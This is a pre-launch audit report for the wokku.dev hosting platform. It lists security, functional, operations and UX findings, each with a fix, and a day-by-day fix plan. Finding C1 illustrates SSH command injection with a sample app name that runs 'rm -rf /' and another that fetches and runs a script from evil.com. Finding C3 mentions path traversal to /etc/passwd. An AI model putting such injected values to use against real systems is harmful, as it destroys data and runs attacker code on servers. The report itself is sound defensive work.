# Wokku.dev Pre-Launch Audit — 2026-04-11

Comprehensive audit run across four dimensions before public beta launch:
security, functionality, UX, and operations.

## Scope

Audited: `/Users/johannesdwicahyo/Projects/2026/wokku.dev` (EE fork)

Most findings apply to both CE (`johannesdwicahyo/wokku`) and EE (`johannesdwicahyo/wokku.dev`)
since the shared code lives in the CE repo and is merged into the fork.

**EE-only findings:** hardcoded iPaymu creds, billing `usage` endpoint, `DatabaseService#tier_name`,
Stripe/iPaymu webhook tests.

**Everything else:** flows back to CE via upstream merge.

---

## 🔴 CRITICAL — Must Fix Before Launch

### C1. SSH Command Injection (RCE)

**Severity:** Critical
**Files affected:**
- `app/services/dokku/apps.rb` — lines 13, 17, 21, 26
- `app/services/dokku/databases.rb` — lines 22, 27, 32, 38, 43
- `app/services/dokku/domains.rb` — lines 15, 19
- `app/services/dokku/config.rb` — lines 18, 22
- `app/services/dokku/processes.rb` — line 14
- `app/services/dokku/resources.rb` — lines 8, 13
- `app/services/dokku/checks.rb` — line 21
- `app/services/dokku/log_drains.rb` — line 8

**Problem:** User-supplied values (app names, database names, domain names, log drain URLs)
are interpolated directly into shell commands via SSH without escaping.

**Attack:** Malicious app name like `my-app; rm -rf /` or `app$(curl evil.com/rce.sh|sh)`
executes arbitrary commands on the Dokku server with the SSH user's privileges.

**Fix:** Use `Shellwords.escape()` on all user-controlled parameters:

```ruby
require "shellwords"

def create(name)
  @client.run("apps:create #{Shellwords.escape(name)}")
end
```

Apply to every method in every `Dokku::*` service.

---

### C2. Hardcoded iPaymu Sandbox Credentials

**Severity:** Critical
**Files affected:**
- `config/deploy.yml` — line 32
- `app/controllers/webhooks/ipaymu_controller.rb` — line 48
- `app/services/ipaymu_client.rb`

**Problem:** Sandbox API credentials are hardcoded as fallback values. Already in git history.

```ruby
api_key = ENV.fetch("IPAYMU_API_KEY", "REDACTED_IPAYMU_KEY")
va      = ENV.fetch("IPAYMU_VA", "REDACTED_IPAYMU_VA")
```

**Fix:**
1. Rotate the keys in the iPaymu dashboard
2. Remove all fallback values — require env vars or raise
3. Move credentials to `.kamal/secrets` (gitignored)

---

### C3. XSS in Docs Markdown Rendering

**Severity:** High
**Files:**
- `app/controllers/docs_controller.rb` — line 44
- `app/views/docs/show.html.erb` — line 4

**Problem:** CommonMarker rendered with `unsafe: true`, output via `raw`. No path traversal
check on `params[:path]`. Attacker could potentially load `../../../etc/passwd` or inject scripts
via markdown.

**Fix:**
```ruby
def render_doc(path)
  base = Rails.root.join("docs/content")
  full = base.join("#{path}.md").expand_path
  raise ActiveRecord::RecordNotFound unless full.to_s.start_with?(base.to_s)
  raise ActiveRecord::RecordNotFound unless full.exist?

  # ... render markdown ...
end
```

Also either disable `unsafe: true` or sanitize with `Sanitize` gem.

---

### C4. DatabaseService#tier_name Method Broken

**Severity:** Critical
**File:** `app/models/database_service.rb:16`

**Problem:** Method references `tier_name` column that doesn't exist in schema.
`BackupRetentionJob` crashes on every run. `database_service.auto_backup?` always fails.

**Fix:** Either add a migration to add `tier_name` column to `database_services`, or
default to `"mini"` if the column is missing:

```ruby
def service_tier
  @service_tier ||= ServiceTier.find_by(
    name: (respond_to?(:tier_name) && tier_name) || "mini",
    service_type: service_type
  )
end
```

Best fix: add the migration.

---

### C5. Missing Billing Usage API Endpoint

**Severity:** High
**File:** `app/controllers/api/v1/billing_controller.rb`

**Problem:** Route `get :usage` defined in `config/routes.rb:167` but no action implemented.
MCP tool `wokku_get_usage` calls this and gets 404.

**Fix:** Add usage action that returns current period cost and resource breakdown.

---

### C6. Database Connection Pool Exhaustion

**Severity:** Critical (operational)
**File:** `config/database.yml:20`

**Problem:**
- 2 Puma processes × 3 threads = 6 Puma threads
- Solid Queue in Puma = 3 more threads
- Total: 9 threads needing DB connections
- Pool size: 5
- **Result: `ActiveRecord::ConnectionPool::QueuedConnectionTimeoutError` under load**

**Fix:** Add to `config/deploy.yml`:
```yaml
env:
  clear:
    RAILS_MAX_THREADS: 10
```

---

### C7. Authorization Bypass on Server Terminal

**Severity:** High
**File:** `app/controllers/dashboard/terminals_controller.rb:14-17`

**Problem:** Uses `current_user.admin?` (global role) instead of Pundit policy (team-based).
Any user with admin role gets access to all servers regardless of team membership.

**Fix:** Use Pundit policy `authorize @server, :admin_terminal?` that checks team membership.

---

## 🟠 HIGH — Fix Before Public Launch

### H1. XSS in 2FA QR Code
`app/controllers/dashboard/two_factor_controller.rb:39` — `raw @qr_code` without validation.

### H2. Rollback Doesn't Actually Rollback
`app/controllers/api/v1/releases_controller.rb:18-26` creates a new release but doesn't pass the old commit_sha to the DeployJob. Rollback just redeploys current branch.

### H3. Domain SSL Endpoint Ignores Domain ID
`app/controllers/api/v1/domains_controller.rb:52` calls `enable_ssl(@app_record.name)` without passing the specific domain. Only works for default domain.

### H4. BackupJob Silent Failures
`app/jobs/backup_job.rb:8-10` catches all errors and logs them but doesn't notify the user. Silent data loss.

### H5. GitHub Webhook Creates Orphaned Deploys
`app/controllers/webhooks/github_controller.rb:34-50` creates Deploy + Release before checking if server is reachable. Stuck deploys if server is down.

### H6. No Job Retry Logic
`app/jobs/application_job.rb` has no `retry_on`. Transient SSH failures, network hiccups, and DB deadlocks discard jobs permanently.

### H7. Rack::Attack Uses MemoryStore
`config/initializers/rack_attack.rb:2` — rate limits not shared across Puma processes. An attacker can multiply their limit by the number of processes.

### H8. N+1 in SyncServerJob
`app/jobs/sync_server_job.rb:29-31, 63-88` queries domains and app_databases per app inside loops. 100 apps = 101 queries every 10 minutes.

### H9. No Disk Space Check Before Deploy
`app/jobs/deploy_job.rb` starts a 15-minute rebuild without checking server disk space. Fails with confusing timeout instead of clear "out of disk".

### H10. Config Get/Unset Unescaped
`app/services/dokku/config.rb:18, 22` — config keys not escaped in shell commands.

### H11. Template Deployer Has No Rollback
`app/services/template_deployer.rb:13-107` — if deploy fails partway, app is in partial state.

### H12. No Mobile Responsive Sidebar
`app/views/layouts/dashboard.html.erb` — sidebar is `fixed left-0 w-64` with main `ml-64`. Mobile layout broken below 768px.

### H13. No Post-Signup Onboarding
After signup, user lands on empty dashboard with zero guidance. Should show "1. Add server, 2. Deploy app, 3. Add domain" checklist.

### H14. No Deploy Progress Indicator
Deploys take 30+ seconds. No visual feedback beyond static status. Users think it's stuck and refresh.

### H15. Server Auth Failed Has No Recovery
`app/views/dashboard/servers/show.html.erb` — "Auth Failed" badge with no troubleshooting action.

### H16. Destructive Actions Use Native Confirm
Browser `confirm()` too easy to click through. Should require type-to-confirm for deletes.

---

## 🟡 MEDIUM — Fix Soon

### Security
- No session timeout (`config/initializers/devise.rb:194` commented out)
- Parameter filter may miss `ssh_private_key` (use explicit names)
- XSS risk in landing page feature icons (`html_safe` without sanitization)

### Functionality
- 13 API controllers with minimal or no tests
- Stripe and iPaymu webhook controllers have **zero tests**
- Missing model validations: Domain format, SSHPublicKey format
- Certificate model is empty (no validations, no tests)
- BackupDestination model has no tests
- Test coverage 69.73% line / 53.28% branch — below target
- `WokkuTest` currently broken (expects `ee?` to be nil/false but returns true)
- 7 failing tests + 26 errors in the suite

### Operations
- SSH connection pooling missing — every operation opens new connection
- Container stats fetch synchronous in dashboard render — blocks page if server slow
- Solid Queue cleanup has no batch size — can lock table
- No query timeout in database.yml
- Metrics polling every 1 min is too aggressive for idle apps
- Billing grace check loads all app_records into memory

### UX
- Form validation errors not field-level
- Required fields not marked
- Non-functional search box in navbar (placeholder)
- Domain DNS pending shows no CNAME instructions
- Backups page doesn't explain "configure destination first"
- Database form doesn't expose tier selection
- API token banner easy to miss (token only shown once)
- No skeleton loaders for async data
- Process scaling counter buttons too small for mobile
- Billing projections don't warn about approaching thresholds

---

## 🟢 LOW — Polish

### Security
- Hardcoded server IP in deploy.yml (should use hostname)

### Ops
- No view fragment caching
- No circuit breaker for Dokku client
- Puma worker restart not configured
- Log rotation not configured
- No container resource limits

### UX
- Tables not horizontally scrollable on mobile
- No breadcrumb navigation
- Activity log language too generic
- Metrics charts missing units
- No keyboard shortcuts

---

## What's Actually Solid

- Database schema and indexing
- Kamal deployment setup and secrets management
- Sentry integration, Rack::Attack configured
- Pundit authorization (mostly)
- Encrypted SSH private keys at rest
- Test coverage exists for critical dashboard flows
- `.kamal/secrets` gitignored
- Pre-commit secret scanning hook

---

## Fix Sequence

**Day 1 — Critical security + blocking ops:**
1. SSH command injection (Shellwords.escape everything)
2. Rotate + remove hardcoded iPaymu credentials
3. Docs XSS (path validation + sanitization)
4. DatabaseService tier_name fix (add column or default)
5. Billing usage endpoint
6. RAILS_MAX_THREADS: 10 in deploy.yml
7. Terminal authorization bypass

**Day 2 — High-severity functional bugs:**
8. Fix rollback to use old commit_sha
9. Fix domain SSL to use specific domain_id
10. BackupJob failure notifications
11. GitHub webhook server check
12. Job retry logic in ApplicationJob
13. Rack::Attack to RedisCacheStore
14. N+1 in SyncServerJob

**Day 3 — UX blockers:**
15. Mobile sidebar responsive
16. Onboarding checklist on dashboard
17. Deploy progress indicator
18. Field-level form validation
19. Type-to-confirm deletes
20. DNS record display for domains

**Day 4 — Tests + ops:**
21. Fix 7 failing tests + 26 errors
22. Tests for webhook controllers (Stripe, iPaymu)
23. SSH connection pooling
24. statement_timeout in database.yml
25. Session timeout in Devise

---

## Status

Audit run: 2026-04-11
Last updated: 2026-04-11
Beta launch: pending critical fixes
